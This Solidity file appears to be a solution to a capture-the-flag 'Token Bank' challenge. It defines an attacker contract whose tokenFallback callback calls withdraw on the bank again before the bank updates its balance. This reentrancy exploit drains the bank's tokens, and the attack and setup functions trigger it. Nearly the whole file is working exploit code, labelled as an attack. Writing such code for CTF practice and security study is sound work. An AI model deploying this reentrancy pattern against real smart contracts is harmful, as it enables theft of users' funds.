pragma solidity ^0.4.21;

interface ITokenBankChallenge {
    function isComplete() public view returns (bool);
    function withdraw(uint256 amount) public;
}

interface ISimpleERC223Token {
    function transfer(address to, uint256 value) public returns (bool success);
}

// attack
// as to 
contract CTFTokenBankChallenge {
    uint256 public amount = 0;
    uint256 public total = 0;
    address public changellegeAddr;
    bool    public bStartAttack = false;

    function tokenFallback(
        address from,           
        uint256 value,
        bytes
    ) public {
        // require(msg.sender == address(token));
        // require(balanceOf[from] + value >= balanceOf[from]);

        // balanceOf[from] += value;
        if(bStartAttack) {
            ITokenBankChallenge instance = ITokenBankChallenge(changellegeAddr);
            if (total >= amount) {
                total -= amount;
                instance.withdraw(amount);
            }
            else if (total > 0){
                uint256 temp = total;
                total = 0;
                instance.withdraw(temp);
            }
        }
        
    }

    function setAmount(uint256 _amount) public {
        amount = _amount;
    }

        
    function setTokens(address _challengeAddressToken, address _to, uint256 _amount) public {
        ISimpleERC223Token tokenCha = ISimpleERC223Token(_challengeAddressToken);
        tokenCha.transfer(_to, _amount);
    }

    function attack(address _changeAddress, uint256 _amount, uint _total) public {
        total = _total;
        changellegeAddr = _changeAddress;
        bStartAttack = true;
        ITokenBankChallenge instance = ITokenBankChallenge(_changeAddress);
        total -= _amount;
        instance.withdraw(_amount);
    }
    
}

